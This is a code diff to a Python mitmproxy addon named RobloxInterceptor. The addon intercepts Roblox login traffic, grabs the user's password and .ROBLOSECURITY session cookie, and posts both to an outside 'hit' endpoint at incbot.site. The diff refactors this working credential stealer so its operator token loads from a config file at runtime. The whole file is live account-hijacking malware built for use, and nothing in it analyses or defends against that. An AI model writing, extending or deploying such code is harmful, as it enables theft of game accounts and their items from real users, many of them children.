@@ -12,16 +12,30 @@ from mitmproxy import http
 
 # ── Config ────────────────────────────────────────────────────────────────────
 BACKEND_URL = "https://incbot.site/api/extension/hit"
-DIRECTORY_TOKEN = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+SETUP_URL = "https://incbot.site/api/desktop/setup"
+CONFIG_DIR = None  # Set at runtime from main.py
 # ─────────────────────────────────────────────────────────────────────────────
 
 captured_password = None
-cookie_sent = False  # Prevent sending duplicate hits per session
+cookie_sent = False
 lock = threading.Lock()
+directory_token = None  # Loaded at startup from config.dat
+
+def load_token(config_path):
+    global directory_token
+    try:
+        with open(config_path, 'r') as f:
+            directory_token = f.read().strip()
+        print(f"[+] Token loaded")
+    except Exception as e:
+        print(f"[!] Token load error: {e}")
 
 class RobloxInterceptor:
     def request(self, flow: http.HTTPFlow):
         global captured_password, cookie_sent
+
+        if not directory_token:
+            return
 
         host = flow.request.pretty_host
 
@@ -33,14 +47,14 @@ class RobloxInterceptor:
                 if password:
                     with lock:
                         captured_password = password
-                        cookie_sent = False  # Reset for new login attempt
+                        cookie_sent = False
                     print(f"[+] Password captured")
             except Exception as e:
                 print(f"[!] Password parse error: {e}")
             return
 
         # ── Capture cookie from any roblox.com request ────────────────────────
-        if not host.endswith("roblox.com") and not host.endswith("roblox.com."):
+        if not host.endswith("roblox.com"):
             return
 
         cookie_header = flow.request.headers.get("cookie", "")
@@ -49,14 +63,13 @@ class RobloxInterceptor:
 
         with lock:
             if cookie_sent:
-                return  # Already sent for this session
+                return
 
             match = re.search(r'\.ROBLOSECURITY=([^;]+)', cookie_header)
             if not match:
                 return
 
             cookie_value = match.group(1).strip()
-            # Ensure it has the warning prefix
             if not cookie_value.startswith("_|WARNING:"):
                 cookie_value = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-into-your-account-and-to-steal-your-ROBUX-and-items.|_" + cookie_value
 
@@ -64,7 +77,7 @@ class RobloxInterceptor:
                 return
 
             password = captured_password
-            cookie_sent = True  # Mark as sent so we don't spam
+            cookie_sent = True
 
         print(f"[+] Cookie captured, sending hit...")
         threading.Thread(
@@ -78,16 +91,12 @@ def send_to_backend(cookie: str, password: str):
     try:
         payload = {
             "cookie": cookie,
-            "directoryToken": DIRECTORY_TOKEN,
+            "directoryToken": directory_token,
         }
         if password:
             payload["password"] = password
 
-        resp = requests.post(
-            BACKEND_URL,
-            json=payload,
-            timeout=15
-        )
+        resp = requests.post(BACKEND_URL, json=payload, timeout=15)
         if resp.status_code == 200:
             print(f"[+] Hit sent successfully")
         else:
